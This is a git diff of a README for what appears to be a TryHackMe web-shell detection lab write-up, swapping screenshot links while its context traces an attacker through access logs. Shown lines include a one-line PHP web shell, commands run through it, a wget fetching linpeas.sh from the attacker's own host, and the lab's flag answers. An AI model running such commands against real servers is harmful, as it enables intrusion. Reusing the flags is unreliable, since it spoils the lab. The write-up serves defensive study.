@@ -57,7 +57,8 @@ Access logs revealed a high-volume burst of GET requests across WordPress paths 
 The attacker's first successful directory hit — returning `200` — was `/wordpress/wp-admin/admin-ajax.php`, revealing a valid and accessible WordPress admin endpoint.
 
 #### 📸 Screenshot 1 — Directory Fuzzing via `ashadyagent/1.1` User-Agent
-<img width="1366" height="728" alt="Directory Fuzzing ashadyagent" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/1_directory_fuzz_ashadyagent.png" />
+<img width="1362" height="726" alt="image" src="https://github.com/user-attachments/assets/c534f147-103b-44fb-8e45-3120765277e2" />
+
 
 *Burst of 404 responses from 203.0.113.66 with ashadyagent/1.1 User-Agent — classic automated directory enumeration pattern*
 
@@ -71,7 +72,7 @@ The attacker's first successful directory hit — returning `200` — was `/word
 Access logs showed the attacker targeting the WordPress login page. A `302` redirect from `/wordpress/wp-admin/` confirmed successful authentication. The attacker now had authenticated access to the WordPress admin panel — including the file upload functionality.
 
 #### 📸 Screenshot 2 — Attacker IP Confirmed & Successful Admin Login via 302 Redirect
-<img width="1366" height="728" alt="Attacker IP and Admin Login" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/2_attacker_ip_first_directory_200.png" />
+<img width="1362" height="726" alt="image" src="https://github.com/user-attachments/assets/fee86a01-b3e0-4970-83f4-65dc816236f8" />
 
 *203.0.113.66 identified as attacker — 200 responses on valid paths and 302 redirect confirms successful WordPress admin login*
 
@@ -86,7 +87,8 @@ Access logs showed the attacker targeting the WordPress login page. A `302` redi
 The attacker used the authenticated session to POST a malicious PHP file via `upload_form.php`. The web shell `shadyshell.php` was successfully written to the uploads directory — a publicly accessible path — giving the attacker persistent HTTP-based command execution on the server.
 
 #### 📸 Screenshot 3 — Web Shell Upload via `upload_form.php` Captured in Access Logs
-<img width="1366" height="728" alt="Web Shell Upload" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/3_webshell_upload_form.png" />
+<img width="1362" height="726" alt="image" src="https://github.com/user-attachments/assets/dcc422fd-f8dc-4fc2-baee-7740ba4e7ddf" />
+
 
 *POST to upload_form.php?file=shadyshell.php — web shell successfully deployed to /wp-content/uploads/*
 
@@ -108,22 +110,25 @@ Subsequent commands observed in access logs:
 - `cmd=cat flag.txt` — flag file read, confirming full filesystem access
 
 #### 📸 Screenshot 4 — Web Shell RCE Confirmed — `whoami` Returns `www-data`
-<img width="1366" height="728" alt="Web Shell whoami" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/4_webshell_whoami_www-data.png" />
+<img width="1366" height="724" alt="image" src="https://github.com/user-attachments/assets/57719186-cda3-482e-bce7-0a223481ad54" />
+
 
 *Web shell accessible at /files/awebshell.php — cmd=whoami returns www-data confirming RCE under web server account*
 
 #### 📸 Screenshot 4b — Flag Retrieved via Web Shell — `cat flag.txt` → `THM{W3b_Sh3ll_Usag3}`
-<img width="1366" height="728" alt="Web Shell Flag" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/4b_webshell_flag_cat_flag_txt.png" />
+<img width="1364" height="724" alt="image" src="https://github.com/user-attachments/assets/511aeb51-2a3a-4c63-a6f2-6b2326fa34db" />
 
 *cmd=cat+flag.txt executed via web shell — THM{W3b_Sh3ll_Usag3} returned, confirming full read access to server filesystem*
 
 #### 📸 Screenshot 6 — First RCE Command (`whoami`) Identified in Access Logs
-<img width="1366" height="728" alt="First Command whoami" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/6_first_command_whoami_access_log.png" />
+<img width="1366" height="731" alt="image" src="https://github.com/user-attachments/assets/8e98320f-1bdb-4b41-b954-966e73212759" />
+
 
 *Access log confirms first web shell command: shadyshell.php?cmd=whoami at 06:14:55 UTC*
 
 #### 📸 Screenshot 7 — `linpeas.sh` Download via `wget` Captured in Access Logs
-<img width="1366" height="728" alt="linpeas.sh Download" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/7_linpeas_download_wget.png" />
+<img width="1366" height="731" alt="image" src="https://github.com/user-attachments/assets/a6d78225-1642-4878-bd05-0f18df7f4439" />
+
 
 *Access log — cmd=wget http://203.0.113.66:8000/linpeas.sh — attacker staging privilege escalation toolkit from their own server*
 
@@ -142,7 +147,7 @@ Subsequent commands observed in access logs:
 File system inspection using `cat` on the web shell revealed a minimal but fully functional one-liner — `system($_GET['cmd'])` passes any URL parameter directly to the system shell with no sanitisation, authentication, or restrictions. An HTML comment in the source contained a hidden flag confirming deep code inspection.
 
 #### 📸 Screenshot 8 — Web Shell Source Code & Hidden Flag Extracted via `cat`
-<img width="1366" height="728" alt="Web Shell Source and Hidden Flag" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/8_webshell_source_hidden_flag.png" />
+<img width="1366" height="731" alt="image" src="https://github.com/user-attachments/assets/05144041-129d-422d-950d-0021e985ed33" />
 
 *cat /var/www/html/wordpress/wp-content/uploads/shadyshell.php — one-line web shell source confirmed, hidden flag THM{W3b_Sh3ll_Int3rnals} extracted from HTML comment*
 
